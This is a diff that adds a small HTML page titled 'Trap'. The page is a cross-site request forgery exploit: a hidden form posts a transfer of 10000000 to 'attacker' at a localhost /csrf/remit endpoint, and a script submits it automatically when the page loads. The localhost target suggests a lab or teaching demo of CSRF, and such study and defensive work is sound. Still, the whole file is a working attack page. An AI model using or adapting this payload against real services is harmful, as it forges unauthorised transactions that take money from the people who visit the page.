@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Trap</title>
+  </head>
+  <body>
+    <form id="remit" action="http://localhost:3002/csrf/remit" method="post">
+      <input type="text" name="to" value="attacker" />
+      <input type="text" name="amount" value="10000000" />
+    </form>
+    <script>
+      document.querySelector("#remit").submit()
+    </script>
+  </body>
+</html>
